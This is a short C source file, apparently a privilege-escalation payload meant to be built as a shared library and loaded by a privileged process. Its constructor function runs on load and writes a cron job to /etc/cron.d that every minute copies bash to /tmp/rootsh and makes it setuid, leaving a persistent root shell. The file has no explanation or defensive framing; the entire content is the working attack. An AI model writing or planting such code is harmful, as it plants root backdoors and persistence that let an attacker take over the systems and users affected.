#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    FILE *f = fopen("/etc/cron.d/xpl", "w");
    if (f) {
        fprintf(f, "* * * * * root cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh\n");
        fclose(f);
    }
}
